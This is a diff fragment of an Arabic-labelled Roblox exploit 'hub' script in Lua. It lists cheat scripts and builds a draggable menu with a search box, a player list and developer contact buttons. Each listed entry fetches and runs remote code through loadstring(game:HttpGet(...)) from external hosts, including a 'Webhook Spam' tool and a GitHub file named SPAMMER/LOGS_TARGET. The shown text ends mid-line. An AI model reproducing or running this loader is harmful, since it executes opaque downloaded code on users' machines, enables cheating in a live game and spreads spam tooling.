+    {id = 51, name = "🎹 سكربت بيانو", desc = "البيانو", color = Color3.fromRGB(200, 200, 255), code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=5539287643800"))("5539287643800")'},
+    {id = 52, name = "📜 سحب سورس سكربتات", desc = "أداة استخراج الأكواد", color = Color3.fromRGB(0, 230, 150), code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=0077328825044"))("0077328825044")'},
+    {id = 53, name = "🦁 سكربت ليو", desc = "LEO HUB", color = Color3.fromRGB(220, 30, 30), code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=2334793182966"))("2334793182966")'},
+    {id = 54, name = "🌑 سكربت دارك", desc = "DARK HUB", color = Color3.fromRGB(80, 0, 120), code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=0841701310725"))("0841701310725")'},
+    {id = 56, name = "🛡️ مضاد كراش", desc = "Anti Crash", color = Color3.fromRGB(0, 180, 220), code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=9348746995916"))("9348746995916")'},
+    {id = 57, name = "🔺 سكربت الفا", desc = "ALPHA", color = Color3.fromRGB(255, 215, 0), code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=3397422540073"))("3397422540073")'},
+    {id = 58, name = "💬 سبام ويب هوك", desc = "Webhook Spam", color = Color3.fromRGB(255, 100, 180), code = 'loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=5916740059656"))("5916740059656")'},
+    {id = 59, name = "🌟 سكربت ياسين القديم", desc = "YASO HUB - النسخة القديمة", color = Color3.fromRGB(255, 215, 0), code = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/YASOHUBV12/SPAMMER/refs/heads/main/LOGS_TARGET.txt"))()'},
+}
+
+-- ============================================================
+-- 🖥️ الواجهة
+-- ============================================================
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "ClanHub"
+ScreenGui.Parent = CoreGui
+ScreenGui.ResetOnSpawn = false
+ScreenGui.DisplayOrder = 9999
+
+local ToggleButton = Instance.new("ImageButton")
+ToggleButton.Size = UDim2.new(0, 80, 0, 60)
+ToggleButton.Position = UDim2.new(0.92, 0, 0.05, 0)
+ToggleButton.BackgroundColor3 = Colors.Main
+ToggleButton.Image = "rbxassetid://101594326510109"
+ToggleButton.ScaleType = Enum.ScaleType.Fit
+ToggleButton.AutoButtonColor = false
+ToggleButton.Parent = ScreenGui
+Instance.new("UICorner", ToggleButton).CornerRadius = UDim.new(0, 12)
+
+local isBtnDragging = false
+local btnDragStart, btnStartPos
+
+ToggleButton.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        isBtnDragging = true
+        btnDragStart = input.Position
+        btnStartPos = ToggleButton.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then isBtnDragging = false end
+        end)
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if isBtnDragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local delta = input.Position - btnDragStart
+        ToggleButton.Position = UDim2.new(btnStartPos.X.Scale, btnStartPos.X.Offset + delta.X, btnStartPos.Y.Scale, btnStartPos.Y.Offset + delta.Y)
+    end
+end)
+
+local MainFrame = Instance.new("ImageLabel")
+MainFrame.Size = UDim2.new(0, 420, 0, 660)
+MainFrame.Position = UDim2.new(0.5, -210, 0.5, -330)
+MainFrame.BackgroundColor3 = Colors.Main
+MainFrame.BackgroundTransparency = 0.05
+MainFrame.Image = "rbxassetid://122216491623956"
+MainFrame.ScaleType = Enum.ScaleType.Slice
+MainFrame.SliceCenter = Rect.new(80, 80, 180, 180)
+MainFrame.Visible = false
+MainFrame.ClipsDescendants = true
+MainFrame.Parent = ScreenGui
+Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 16)
+
+local MainStroke = Instance.new("UIStroke")
+MainStroke.Color = Colors.Accent
+MainStroke.Thickness = 2
+MainStroke.Transparency = 0.3
+MainStroke.Parent = MainFrame
+
+local Header = Instance.new("Frame")
+Header.Size = UDim2.new(1, 0, 0, 50)
+Header.BackgroundColor3 = Colors.Secondary
+Header.BackgroundTransparency = 0.5
+Header.Parent = MainFrame
+Instance.new("UICorner", Header).CornerRadius = UDim.new(0, 16, 0, 0)
+
+local HeaderTitle = Instance.new("TextLabel")
+HeaderTitle.Size = UDim2.new(1, -140, 1, 0)
+HeaderTitle.Position = UDim2.new(0, 16, 0, 0)
+HeaderTitle.BackgroundTransparency = 1
+HeaderTitle.Text = "🔥 xlIlIlIlxlIIlIIIlx"
+HeaderTitle.TextColor3 = Colors.Accent
+HeaderTitle.Font = Enum.Font.GothamBlack
+HeaderTitle.TextSize = 16
+HeaderTitle.TextXAlignment = Enum.TextXAlignment.Left
+HeaderTitle.Parent = Header
+
+local SizeBtnContainer = Instance.new("Frame")
+SizeBtnContainer.Size = UDim2.new(0, 105, 1, 0)
+SizeBtnContainer.Position = UDim2.new(1, -115, 0, 0)
+SizeBtnContainer.BackgroundTransparency = 1
+SizeBtnContainer.Parent = Header
+
+local MinusBtn = Instance.new("TextButton")
+MinusBtn.Size = UDim2.new(0, 30, 0, 30)
+MinusBtn.Position = UDim2.new(0, 0, 0.5, -15)
+MinusBtn.BackgroundColor3 = Colors.Card
+MinusBtn.Text = "−"
+MinusBtn.TextColor3 = Colors.Text
+MinusBtn.Font = Enum.Font.GothamBold
+MinusBtn.TextSize = 20
+MinusBtn.Parent = SizeBtnContainer
+Instance.new("UICorner", MinusBtn).CornerRadius = UDim.new(0, 6)
+
+local PlusBtn = Instance.new("TextButton")
+PlusBtn.Size = UDim2.new(0, 30, 0, 30)
+PlusBtn.Position = UDim2.new(0, 35, 0.5, -15)
+PlusBtn.BackgroundColor3 = Colors.Card
+PlusBtn.Text = "+"
+PlusBtn.TextColor3 = Colors.Text
+PlusBtn.Font = Enum.Font.GothamBold
+PlusBtn.TextSize = 20
+PlusBtn.Parent = SizeBtnContainer
+Instance.new("UICorner", PlusBtn).CornerRadius = UDim.new(0, 6)
+
+local CopyRightsBtn = Instance.new("TextButton")
+CopyRightsBtn.Size = UDim2.new(0, 30, 0, 30)
+CopyRightsBtn.Position = UDim2.new(1, -30, 0.5, -15)
+CopyRightsBtn.BackgroundColor3 = Colors.AccentGold
+CopyRightsBtn.Text = "📋"
+CopyRightsBtn.TextColor3 = Colors.Text
+CopyRightsBtn.Font = Enum.Font.GothamBold
+CopyRightsBtn.TextSize = 16
+CopyRightsBtn.Parent = SizeBtnContainer
+Instance.new("UICorner", CopyRightsBtn).CornerRadius = UDim.new(0, 6)
+
+local CloseBtn = Instance.new("TextButton")
+CloseBtn.Size = UDim2.new(0, 30, 0, 30)
+CloseBtn.Position = UDim2.new(1, -4, 0.5, -15)
+CloseBtn.BackgroundColor3 = Colors.Error
+CloseBtn.Text = "✕"
+CloseBtn.TextColor3 = Colors.Text
+CloseBtn.Font = Enum.Font.GothamBold
+CloseBtn.TextSize = 16
+CloseBtn.Parent = Header
+Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 6)
+
+local rightsText = [[
+🔥 روب xlIlIlIlxlIIlIIIlx 🔥
+📱 تيك توك: band_owner
+📨 تيليجرام: @idontknowbacks
+━━━━━━━━━━━━━━━━━━━━━━━
+تم التطوير بواسطة جاسم
+━━━━━━━━━━━━━━━━━━━━━━━
+📢 أي شي تحتاجه أو مشكلة في السكربت
+أو تريد إضافة سكربتات لفعاليات أو لغير ماب
+تواصل تيك أو تيليجرام
+]]
+
+CopyRightsBtn.MouseButton1Click:Connect(function()
+    pcall(function()
+        setclipboard(rightsText)
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "✅ تم نسخ الحقوق",
+            Text = "تم نسخ حقوق المطور!",
+            Duration = 3
+        })
+    end)
+end)
+
+local UsersFrame = Instance.new("Frame")
+UsersFrame.Size = UDim2.new(1, -24, 0, 65)
+UsersFrame.Position = UDim2.new(0, 12, 0, 56)
+UsersFrame.BackgroundColor3 = Colors.Card
+UsersFrame.BackgroundTransparency = 0.3
+UsersFrame.Parent = MainFrame
+Instance.new("UICorner", UsersFrame).CornerRadius = UDim.new(0, 10)
+
+local UsersStroke = Instance.new("UIStroke")
+UsersStroke.Color = Colors.Border
+UsersStroke.Thickness = 1.5
+UsersStroke.Parent = UsersFrame
+
+local UsersCountLabel = Instance.new("TextLabel")
+UsersCountLabel.Size = UDim2.new(0.5, 0, 0, 20)
+UsersCountLabel.Position = UDim2.new(0, 10, 0, 4)
+UsersCountLabel.BackgroundTransparency = 1
+UsersCountLabel.Text = "👥 عدد المستخدمين: 0"
+UsersCountLabel.TextColor3 = Colors.Accent
+UsersCountLabel.Font = Enum.Font.GothamBold
+UsersCountLabel.TextSize = 12
+UsersCountLabel.TextXAlignment = Enum.TextXAlignment.Left
+UsersCountLabel.Parent = UsersFrame
+
+local DevStatusLabel = Instance.new("TextLabel")
+DevStatusLabel.Size = UDim2.new(0.5, 0, 0, 20)
+DevStatusLabel.Position = UDim2.new(0.5, 0, 0, 4)
+DevStatusLabel.BackgroundTransparency = 1
+DevStatusLabel.Text = "👑 المطور: جاري البحث..."
+DevStatusLabel.TextColor3 = Colors.TextDim
+DevStatusLabel.Font = Enum.Font.GothamBold
+DevStatusLabel.TextSize = 12
+DevStatusLabel.TextXAlignment = Enum.TextXAlignment.Right
+DevStatusLabel.Parent = UsersFrame
+
+local UsersListLabel = Instance.new("TextLabel")
+UsersListLabel.Size = UDim2.new(1, -20, 0, 30)
+UsersListLabel.Position = UDim2.new(0, 10, 0, 28)
+UsersListLabel.BackgroundTransparency = 1
+UsersListLabel.Text = "المستخدمون: جاري التحميل..."
+UsersListLabel.TextColor3 = Colors.TextDim
+UsersListLabel.Font = Enum.Font.Gotham
+UsersListLabel.TextSize = 10
+UsersListLabel.TextXAlignment = Enum.TextXAlignment.Left
+UsersListLabel.TextWrapped = true
+UsersListLabel.Parent = UsersFrame
+
+local function UpdateUsersInfo()
+    local players = Players:GetPlayers()
+    local count = #players
+    local names = {}
+    local devFound = false
+    local devNames = {"band_owner", "vr7olo", "xlIlIlIlxlIIlIIIlx"}
+
+    for _, player in ipairs(players) do
+        table.insert(names, player.Name)
+        for _, dev in ipairs(devNames) do
+            if string.lower(player.Name) == string.lower(dev) or string.lower(player.DisplayName) == string.lower(dev) then
+                devFound = true
+            end
+        end
+    end
+
+    UsersCountLabel.Text = "👥 عدد المستخدمين: " .. count
+
+    if devFound then
+        DevStatusLabel.Text = "👑 المطور: ✅ موجود"
+        DevStatusLabel.TextColor3 = Colors.Success
+    else
+        DevStatusLabel.Text = "👑 المطور: ❌ غير موجود"
+        DevStatusLabel.TextColor3 = Colors.Error
+    end
+
+    if count > 0 then
+        local namesStr = table.concat(names, ", ")
+        if #namesStr > 60 then namesStr = string.sub(namesStr, 1, 60) .. "..." end
+        UsersListLabel.Text = "👤 المستخدمون: " .. namesStr
+    else
+        UsersListLabel.Text = "👤 لا يوجد مستخدمون"
+    end
+end
+
+UpdateUsersInfo()
+RunService.Heartbeat:Connect(UpdateUsersInfo)
+Players.PlayerAdded:Connect(UpdateUsersInfo)
+Players.PlayerRemoving:Connect(UpdateUsersInfo)
+
+local SearchFrame = Instance.new("Frame")
+SearchFrame.Size = UDim2.new(1, -24, 0, 36)
+SearchFrame.Position = UDim2.new(0, 12, 0, 128)
+SearchFrame.BackgroundColor3 = Colors.Search
+SearchFrame.Parent = MainFrame
+Instance.new("UICorner", SearchFrame).CornerRadius = UDim.new(0, 8)
+
+local SearchStroke = Instance.new("UIStroke")
+SearchStroke.Color = Colors.Border
+SearchStroke.Thickness = 1.5
+SearchStroke.Parent = SearchFrame
+
+local SearchIcon = Instance.new("TextLabel")
+SearchIcon.Size = UDim2.new(0, 30, 1, 0)
+SearchIcon.Position = UDim2.new(0, 8, 0, 0)
+SearchIcon.BackgroundTransparency = 1
+SearchIcon.Text = "🔍"
+SearchIcon.TextColor3 = Colors.TextDim
+SearchIcon.Font = Enum.Font.Gotham
+SearchIcon.TextSize = 14
+SearchIcon.Parent = SearchFrame
+
+local SearchBox = Instance.new("TextBox")
+SearchBox.Size = UDim2.new(1, -44, 1, 0)
+SearchBox.Position = UDim2.new(0, 38, 0, 0)
+SearchBox.BackgroundTransparency = 1
+SearchBox.PlaceholderText = "ابحث عن سكربت..."
+SearchBox.PlaceholderColor3 = Colors.TextDim
+SearchBox.Text = ""
+SearchBox.TextColor3 = Colors.Text
+SearchBox.Font = Enum.Font.GothamMedium
+SearchBox.TextSize = 12
+SearchBox.TextXAlignment = Enum.TextXAlignment.Left
+SearchBox.Parent = SearchFrame
+
+local ScriptScroll = Instance.new("ScrollingFrame")
+ScriptScroll.Size = UDim2.new(1, 0, 1, -275)
+ScriptScroll.Position = UDim2.new(0, 0, 0, 172)
+ScriptScroll.BackgroundTransparency = 1
+ScriptScroll.ScrollBarThickness = 4
+ScriptScroll.ScrollBarImageColor3 = Colors.Accent
+ScriptScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
+ScriptScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
+ScriptScroll.Parent = MainFrame
+
+local ScriptLayout = Instance.new("UIListLayout")
+ScriptLayout.Padding = UDim.new(0, 6)
+ScriptLayout.SortOrder = Enum.SortOrder.LayoutOrder
+ScriptLayout.Parent = ScriptScroll
+
+local ScriptPadding = Instance.new("UIPadding")
+ScriptPadding.PaddingLeft = UDim.new(0, 8)
+ScriptPadding.PaddingRight = UDim.new(0, 8)
+ScriptPadding.PaddingTop = UDim.new(0, 4)
+ScriptPadding.PaddingBottom = UDim.new(0, 8)
+ScriptPadding.Parent = ScriptScroll
+
+local ContactFrame = Instance.new("Frame")
+ContactFrame.Size = UDim2.new(1, -24, 0, 40)
+ContactFrame.Position = UDim2.new(0, 12, 1, -48)
+ContactFrame.BackgroundColor3 = Colors.Card
+ContactFrame.BackgroundTransparency = 0.3
+ContactFrame.Parent = MainFrame
+Instance.new("UICorner", ContactFrame).CornerRadius = UDim.new(0, 10)
+
+local ContactStroke = Instance.new("UIStroke")
+ContactStroke.Color = Colors.Accent
+ContactStroke.Thickness = 1.5
+ContactStroke.Transparency = 0.3
+ContactStroke.Parent = ContactFrame
+
+local ContactBtn = Instance.new("TextButton")
+ContactBtn.Size = UDim2.new(1, 0, 1, 0)
+ContactBtn.BackgroundTransparency = 1
+ContactBtn.Text = "📞 تواصل ~ band_owner / @idontknowbacks"
+ContactBtn.TextColor3 = Colors.Accent
+ContactBtn.Font = Enum.Font.GothamBold
+ContactBtn.TextSize = 12
+ContactBtn.Parent = ContactFrame
+
+ContactBtn.MouseButton1Click:Connect(function()
+    pcall(function()
+        setclipboard("band_owner / @idontknowbacks")
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "✅ تم النسخ",
+            Text = "band_owner / @idontknowbacks",
+            Duration = 3
+        })
+    end)
+end)
+
+local ScriptCards = {}
+
+local function CreateScriptCard(scriptData)
+    local Card = Instance.new("Frame")
+    Card.Size = UDim2.new(1, 0, 0, 68)
+    Card.BackgroundColor3 = Colors.Card
+    Card.BackgroundTransparency = 0.3
+    Card.ClipsDescendants = true
+    Card.Parent = ScriptScroll
+    Instance.new("UICorner", Card).CornerRadius = UDim.new(0, 10)
+
+    local CardStroke = Instance.new("UIStroke")
+    CardStroke.Color = Colors.Border
+    CardStroke.Thickness = 1.5
+    CardStroke.Parent = Card
+
+    local IdLabel = Instance.new("TextLabel")
+    IdLabel.Size = UDim2.new(0, 30, 0, 30)
+    IdLabel.Position = UDim2.new(0, 8, 0.5, -15)
+    IdLabel.BackgroundColor3 = scriptData.color
+    IdLabel.BackgroundTransparency = 0.2
+    IdLabel.Text = tostring(scriptData.id)
+    IdLabel.TextColor3 = scriptData.color
+    IdLabel.Font = Enum.Font.GothamBlack
+    IdLabel.TextSize = 13
+    IdLabel.Parent = Card
+    Instance.new("UICorner", IdLabel).CornerRadius = UDim.new(1, 0)
+
+    local NameLabel = Instance.new("TextLabel")
+    NameLabel.Size = UDim2.new(0.5, -50, 0, 20)
+    NameLabel.Position = UDim2.new(0, 48, 0, 8)
+    NameLabel.BackgroundTransparency = 1
+    NameLabel.Text = scriptData.name
+    NameLabel.TextColor3 = Colors.Text
+    NameLabel.Font = Enum.Font.GothamBold
+    NameLabel.TextSize = 12
+    NameLabel.TextXAlignment = Enum.TextXAlignment.Left
+    NameLabel.Parent = Card
+
+    local DescLabel = Instance.new("TextLabel")
+    DescLabel.Size = UDim2.new(0.5, -50, 0, 18)
+    DescLabel.Position = UDim2.new(0, 48, 0, 30)
+    DescLabel.BackgroundTransparency = 1
+    DescLabel.Text = scriptData.desc
+    DescLabel.TextColor3 = Colors.TextDim
+    DescLabel.Font = Enum.Font.Gotham
+    DescLabel.TextSize = 10
+    DescLabel.TextXAlignment = Enum.TextXAlignment.Left
+    DescLabel.Parent = Card
+
+    local RunBtn = Instance.new("TextButton")
+    RunBtn.Size = UDim2.new(0, 85, 0, 30)
+    RunBtn.Position = UDim2.new(1, -95, 0.5, -15)
+    RunBtn.BackgroundColor3 = scriptData.color
+    RunBtn.Text = "▶ تشغيل"
+    RunBtn.TextColor3 = Colors.Text
+    RunBtn.Font = Enum.Font.GothamBold
+    RunBtn.TextSize = 11
+    RunBtn.Parent = Card
+    Instance.new("UICorner", RunBtn).CornerRadius = UDim.new(0, 8)
+
+    Card.MouseEnter:Connect(function()
+        TweenService:Create(Card, TweenInfo.new(0.15), {BackgroundTransparency = 0}):Play()
+        TweenService:Create(CardStroke, TweenInfo.new(0.15), {Color = scriptData.color, Thickness = 2}):Play()
+    end)
+
+    Card.MouseLeave:Connect(function()
+        TweenService:Create(Card, TweenInfo.new(0.15), {BackgroundTransparency = 0.3}):Play()
+        TweenService:Create(CardStroke, TweenInfo.new(0.15), {Color = Colors.Border, Thickness = 1.5}):Play()
+    end)
+
+    RunBtn.MouseButton1Click:Connect(function()
+        local originalText = RunBtn.Text
+        RunBtn.Text = "⏳"
+        RunBtn.BackgroundColor3 = Colors.Warning
+
+        local success = ExecuteScript(scriptData.code, scriptData.name)
+
+        if success then
+            RunBtn.Text = "✅"
+            RunBtn.BackgroundColor3 = Colors.Success
+            pcall(function()
+                game:GetService("StarterGui"):SetCore("SendNotification", {
+                    Title = "✅ تم التشغيل",
+                    Text = scriptData.name .. " يعمل الآن!",
+                    Duration = 3
+                })
+            end)
+        else
+            RunBtn.Text = "❌"
+            RunBtn.BackgroundColor3 = Colors.Error
+        end
+
+        task.delay(2, function()
+            RunBtn.Text = originalText
+            RunBtn.BackgroundColor3 = scriptData.color
+        end)
+    end)
+
+    ScriptCards[scriptData.name] = Card
+end
+
+for _, script in ipairs(Scripts) do
+    CreateScriptCard(script)
+end
+
+SearchBox:GetPropertyChangedSignal("Text"):Connect(function()
+    local searchText = SearchBox.Text:lower()
+    for name, card in pairs(ScriptCards) do
+        card.Visible = searchText == "" or name:lower():find(searchText)
+    end
+end)
+
+local isDragging = false
+local dragStart, startPos
+
+Header.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        isDragging = true
+        dragStart = input.Position
+        startPos = MainFrame.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then isDragging = false end
+        end)
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if isDragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local delta = input.Position - dragStart
+        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+
+local currentSize = 1
+MinusBtn.MouseButton1Click:Connect(function()
+    if currentSize > 0.7 then
+        currentSize = currentSize - 0.05
+        local w, h = 420 * currentSize, 660 * currentSize
+        TweenService:Create(MainFrame, TweenInfo.new(0.2), {Size = UDim2.new(0, w, 0, h), Position = UDim2.new(0.5, -w/2, 0.5, -h/2)}):Play()
+    end
+end)
+
+PlusBtn.MouseButton1Click:Connect(function()
+    if curren
+... (3 KB left)
